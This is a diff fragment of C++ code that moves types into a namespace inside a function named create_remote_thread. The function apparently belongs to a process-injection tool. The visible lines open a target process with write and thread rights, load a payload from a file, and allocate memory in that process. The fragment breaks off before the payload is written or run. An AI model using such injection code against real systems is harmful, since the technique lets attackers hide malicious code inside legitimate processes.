@@ -25,14 +25,14 @@ __forceinline char* extract_bytes_from_file(const char* f, size_t* size) {
     return bytesRead;
 }
 
-unsigned create_remote_thread(const resource& res, const injector& inj) {
-    exec_mem_t              exec_mem = nullptr;
-    HANDLE                  process_handle = nullptr;
-    HANDLE                  hThread = nullptr;
-    DWORD                   old_protect = 0;
-    BOOL                    bSuccess = 0;
-    char*                   payload = 0;
-    size_t                  size = 0;
+unsigned create_remote_thread(const types::resource& res, const types::injector& inj) {
+    types::exec_mem_t exec_mem = nullptr;
+    HANDLE            process_handle = nullptr;
+    HANDLE            hThread = nullptr;
+    DWORD             old_protect = 0;
+    BOOL              bSuccess = 0;
+    char*             payload = 0;
+    size_t            size = 0;
 
     LOG_MSG(inj, "Opening target process..", 0);
     if (!(process_handle = OpenProcess(PROCESS_CREATE_THREAD | PROCESS_QUERY_INFORMATION | PROCESS_VM_READ | PROCESS_VM_WRITE | PROCESS_VM_OPERATION, FALSE, res.process_id))) {
@@ -44,7 +44,7 @@ unsigned create_remote_thread(const resource& res, const injector& inj) {
 
     LOG_MSG(inj, "Allocating virtual memory to target..", 0);
     payload = extract_bytes_from_file(res.relative_payload_path, &size);
-    if (!(exec_mem = (exec_mem_t)VirtualAllocEx(process_handle, nullptr, size, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE))) {
+    if (!(exec_mem = (types::exec_mem_t)VirtualAllocEx(process_handle, nullptr, size, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE))) {
         LOG_MSG(inj, "Failed to allocate memory to target", 0);
         printf("exec_mem: %p\n", exec_mem);
         CloseHandle(process_handle);
